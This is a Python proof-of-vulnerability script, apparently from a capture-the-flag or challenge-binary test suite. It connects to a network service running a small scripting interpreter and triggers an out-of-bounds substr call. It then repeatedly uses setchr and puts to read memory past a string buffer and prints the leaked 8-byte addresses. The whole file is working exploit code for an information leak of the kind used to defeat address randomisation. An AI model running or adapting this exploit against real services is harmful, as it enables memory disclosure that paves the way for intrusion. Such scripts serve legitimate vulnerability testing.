import sys
import socket
import random
import time
import string
import base64
import os
import datetime
import string
import struct
import signal

pwd = ''
homedir = ''

def handler( signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely unsuccessful')
    exit(0)

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def RU( s, u ):
    z = b''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1)
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

def RL( s ):
    return RU( s, b'\n')

def SW(s, data):
    #print data
    s.sendall(data)

def RB(s):
    return RU(s, b'>>> ')

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(120)
    
    s = connect( HOST, PORT )

    RB(s)

    cmd = b'string a = substr("' + b'A'*50 + b'", 49, 300);'

    s.send(cmd + b'\n')

    expected_len = 1
    leaks = []

    print('Searching', end='', flush=True)

    for x in range(1, 292):

        if ( x % 20 == 0):
            print('.', end='', flush=True)

        RB(s)

        cmd = b'setchr( a, "A", ' + str(x).encode('UTF-8') + b');'

        s.send(cmd + b'\n')

        RB(s)

        cmd = b'puts(a);'

        s.send(cmd + b'\n')

        y = RL(s).rstrip(b'\n')

        ## It should be 'o' + 'A'*x
        leaked = y[x+1:]

        if len(leaked) > 5 and len(leaked) < 8:
            leaks.append(leaked)

    print('\n')

    print(leaks)

    if len(leaks) == 0:
        print('[FAIL] POV failed')
        exit(1)
        
    for x in leaks:
        if len(x) < 8:
            x += b'\x00'*(8-len(x))
        print('[ADDRESS] = %s' %hex( struct.unpack('Q', x)[0]))

    print('[SUCCESS] POV completed successfully')

if __name__ == '__main__':
    main()
